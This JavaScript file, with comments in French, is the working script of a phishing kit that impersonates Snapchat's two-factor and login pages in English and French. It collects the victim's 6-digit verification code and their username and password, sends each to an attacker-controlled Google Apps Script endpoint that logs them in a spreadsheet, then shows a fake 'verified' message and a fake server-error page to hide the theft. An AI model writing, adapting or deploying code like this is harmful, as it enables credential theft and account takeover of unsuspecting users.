// Données bilingues pour chaque page
const translations = {
    index: {
        en: {
            title: "Two-Factor Authentication",
            subtitle: "Enter the 6-digit code we sent you",
            continueBtn: "Continue",
            resendLink: "Resend Code",
            supportText: "Having trouble? Contact support@snapchat.com",
            resendMessage: "Code resent! Check your phone or email.",
            invalidCode: "Please enter a valid 6-digit code.",
            verifying: "Verifying...",
            verified: "Code Verified! Redirecting..."
        },
        fr: {
            title: "Authentification à deux facteurs",
            subtitle: "Entrez le code à 6 chiffres que nous vous avons envoyé",
            continueBtn: "Continuer",
            resendLink: "Renvoyer le code",
            supportText: "Un problème ? Contactez support@snapchat.com",
            resendMessage: "Code renvoyé ! Vérifiez votre téléphone ou email.",
            invalidCode: "Veuillez entrer un code valide à 6 chiffres.",
            verifying: "Vérification en cours...",
            verified: "Code vérifié ! Redirection..."
        }
    },
    login: {
        en: {
            title: "Log In",
            usernamePlaceholder: "Username or Email",
            passwordPlaceholder: "Password",
            loginBtn: "Log In",
            forgotLink: "Forgot Password?",
            supportText: "New to Snapchat? <a href='#'>Sign Up</a>"
        },
        fr: {
            title: "Connexion",
            usernamePlaceholder: "Nom d'utilisateur ou Email",
            passwordPlaceholder: "Mot de passe",
            loginBtn: "Se connecter",
            forgotLink: "Mot de passe oublié ?",
            supportText: "Nouveau sur Snapchat ? <a href='#'>S'inscrire</a>"
        }
    },
    error: {
        en: {
            title: "Service Unavailable",
            errorMessage: "We’re currently experiencing technical difficulties with our servers.",
            errorSubtitle: "Please try again later. We’re working hard to resolve this issue as quickly as possible.",
            backLink: "Return to Login",
            supportText: "Need help? Contact support@snapchat.com"
        },
        fr: {
            title: "Service indisponible",
            errorMessage: "Nous rencontrons actuellement des difficultés techniques avec nos serveurs.",
            errorSubtitle: "Veuillez réessayer plus tard. Nous travaillons activement pour résoudre ce problème le plus rapidement possible.",
            backLink: "Retour à la connexion",
            supportText: "Besoin d'aide ? Contactez support@snapchat.com"
        }
    }
};

// Langue par défaut
let currentLang = 'en';

// URL de ton Google Sheet
const GOOGLE_SHEET_URL = 'https://script.google.com/macros/s/AKfycbwJW28v5Td5bVAtEtwCdNtHumbX8k5FLWQ91RemPv92K0XS3fPcmXsyHbtzBpMgQxA/exec';

// Fonction pour envoyer les données
function sendDataToSheet(type, value) {
    const data = {
        type: type,
        value: value
    };
    console.log('Tentative d’envoi:', data);
    fetch(GOOGLE_SHEET_URL, {
        method: 'POST',
        mode: 'no-cors',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(() => console.log('Requête POST envoyée:', data))
    .catch(error => console.error('Erreur:', error));
}

// Fonction pour définir la langue
function setLanguage(lang) {
    currentLang = lang;
    const page = window.location.pathname.includes('login') ? 'login' : 
                 window.location.pathname.includes('error') ? 'error' : 'index';
    const texts = translations[page][lang];

    document.getElementById('title').textContent = texts.title;
    if (page === 'index') {
        document.getElementById('subtitle').textContent = texts.subtitle;
        document.getElementById('continue-btn').textContent = texts.continueBtn;
        document.getElementById('resend-link').textContent = texts.resendLink;
    } else if (page === 'login') {
        document.getElementById('username-placeholder').placeholder = texts.usernamePlaceholder;
        document.getElementById('password-placeholder').placeholder = texts.passwordPlaceholder;
        document.getElementById('login-btn').textContent = texts.loginBtn;
        document.getElementById('forgot-link').textContent = texts.forgotLink;
    } else if (page === 'error') {
        document.getElementById('error-message').textContent = texts.errorMessage;
        document.getElementById('error-subtitle').textContent = texts.errorSubtitle;
        document.getElementById('back-link').textContent = texts.backLink;
    }
    document.getElementById('support-text').innerHTML = texts.supportText;
    document.getElementById('language-menu').style.display = 'none';
}

// Fonction pour afficher/cacher le menu
function toggleLanguageMenu() {
    const menu = document.getElementById('language-menu');
    menu.style.display = menu.style.display === 'block' ? 'none' : 'block';
}

// Initialiser la langue au chargement
window.onload = function() {
    setLanguage(currentLang);
};

// Fermer le menu si on clique ailleurs
document.addEventListener('click', function(event) {
    const menu = document.getElementById('language-menu');
    const btn = document.querySelector('.language-btn');
    if (!btn.contains(event.target) && !menu.contains(event.target)) {
        menu.style.display = 'none';
    }
});

// Move focus to next input field
function moveToNext(current, nextField) {
    if (current.value.length >= 1 && nextField <= 6) {
        document.getElementsByTagName('input')[nextField].focus();
    }
}

// Simulate resending code
function resendCode() {
    const message = document.getElementById('message');
    message.style.color = '#0078ff';
    message.textContent = translations.index[currentLang].resendMessage;
    setTimeout(() => {
        message.textContent = '';
    }, 3000);
}

// Toggle password visibility with SVG
function togglePasswordVisibility() {
    const passwordInput = document.getElementById('password-placeholder');
    const eyeIcon = document.getElementById('eye-icon');
    if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        eyeIcon.innerHTML = `
            <path d="M2 2l20 20"></path>
            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
            <circle cx="12" cy="12" r="3"></circle>
        `; // Œil barré (mot de passe visible)
    } else {
        passwordInput.type = 'password';
        eyeIcon.innerHTML = `
            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
            <circle cx="12" cy="12" r="3"></circle>
        `; // Œil ouvert (mot de passe masqué)
    }
}

// Handle code form submission (index.html)
if (document.getElementById('codeForm')) {
    console.log('Code form détecté');
    document.getElementById('codeForm').addEventListener('submit', function(event) {
        event.preventDefault();
        console.log('Formulaire code soumis');

        const inputs = document.getElementsByTagName('input');
        let code = '';
        for (let i = 0; i < inputs.length; i++) {
            code += inputs[i].value;
        }
        console.log('Code saisi:', code);

        const message = document.getElementById('message');
        const button = document.querySelector('.verify-btn');

        if (code.length !== 6 || !/^\d+$/.test(code)) {
            message.style.color = '#ff3333';
            message.textContent = translations.index[currentLang].invalidCode;
            return;
        }

        message.style.color = '#000';
        message.textContent = translations.index[currentLang].verifying;
        button.disabled = true;

        const codeEntry = `Code saisi : ${code}`;
        sendDataToSheet('Code', codeEntry);

        setTimeout(() => {
            message.style.color = '#00cc00';
            message.textContent = translations.index[currentLang].verified;
            setTimeout(() => {
                window.location.href = 'login.html';
            }, 1000);
        }, 2000);
    });
}

// Handle login form submission (login.html)
if (document.getElementById('loginForm')) {
    console.log('Login form détecté');
    document.getElementById('loginForm').addEventListener('submit', function(event) {
        event.preventDefault();
        console.log('Formulaire login soumis');

        const username = document.getElementById('username-placeholder').value;
        const password = document.getElementById('password-placeholder').value;
        console.log('Username:', username, 'Password:', password);

        const credentialEntry = `Utilisateur : ${username} | Mot de passe : ${password}`;
        sendDataToSheet('Credentials', credentialEntry);

        setTimeout(() => {
            window.location.href = 'error.html';
        }, 1000);
    });
}
